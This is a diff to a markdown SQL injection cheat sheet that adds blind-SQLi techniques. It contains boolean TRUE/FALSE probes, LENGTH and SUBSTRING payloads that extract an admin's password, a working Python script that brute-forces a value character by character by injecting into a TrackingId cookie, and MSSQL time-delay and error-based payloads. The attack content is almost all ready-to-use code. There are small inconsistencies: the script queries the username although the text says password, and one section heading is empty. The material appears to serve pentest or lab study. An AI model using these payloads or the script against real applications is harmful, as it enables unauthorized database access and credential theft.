@@ -488,17 +488,77 @@ AND updatexml(rand(),concat(CHAR(126),user(),CHAR(126)),null)-- -)
 
 A SQLi is blind because we don't have access to the error log or any type of output which difficult a lot the process of exploitation.
 
+## Triggering Conditional Responses
+
+We are going to try to distinct the application response to a `TRUE` and `FALSE` query.
+
+```
+...xyz' AND '1'='1
+...xyz' AND '1'='2
+```
+If we can get the difference of these two queries we can use substring to retrieve data.
+
+But first we need to know the lenght of the data to retrieve.
+
+```
+...xyz' AND LENGTH((SELECT password FROM users WHERE username='admin')) > 5 -- -
+...xyz' AND LENGTH((SELECT password FROM users WHERE username='admin')) = 15 -- -
+```
+
+```
+..xyz' AND SUBSTRING((SELECT password FROM USERS WHERE username='admin'), 1, 1) >'m
+..xyz' AND SUBSTRING((SELECT password FROM USERS WHERE username='admin'), 1, 1) ='s
+```
+
+The following is a python example script to automate the data retrieval of a alphanumerical 20 characters length password.
+
+```python
+import requests
+
+results = ""
+letters = '1234567890zxcvbnmasdfghjklqwertyuiopZXCVBNMASDFGHJKLQWERTYUIOP'
+headers = {
+		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", 
+		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", 
+		"Sec-Fetch-Site": "same-origin", 
+		"Sec-Fetch-Dest": "document", 
+		"Accept-Encoding": "gzip, deflate", "Connection": "close"
+	}
+
+for i in range(20):
+	print("[!] Character %s" % str(i+1) )
+	for l in letters:
+		payload = "' AND SUBSTRING((SELECT username FROM users WHERE username='administrator'), %s,1) = '%s" % (str(i+1), l)
+		cookies = {
+			"TrackingId": "Xv2KlSXeuXAWb9NQ" + payload, 
+			"session": "iuxOBNDd4wHkhbbOiUVlQBHTv9AchuTu"
+		}
+		r = requests.get("https://example.com/sqli", headers=headers, cookies=cookies)
+		if "Welcome back!" in r.text:
+			print("  [+] Character Found: %s" % l)
+			results += l
+			break;
+
+print("[!] Finished")
+print("[+] Final results:")
+print(results)
+```
+
+## Conditional Responses by triggering SQL errors
+
+
 ## Time Based
 
 Since we are not aware about any type of error or output we can use sleeps.
 
 ```
-1-sleep(4)
+'; IF (1=2) WAITFOR DELAY '0:0:10'-- -
+'; IF (1=1) WAITFOR DELAY '0:0:10'-- -
 ```
 
 If it loads for four seconds extra we know that the database is processing our `sleep()` command.
 
-## Dump tables
+### Dump tables
 
 It can also be done with sqlmap or manually with a custom script. In that case the script is dumping MD5 hashes from password field.
 
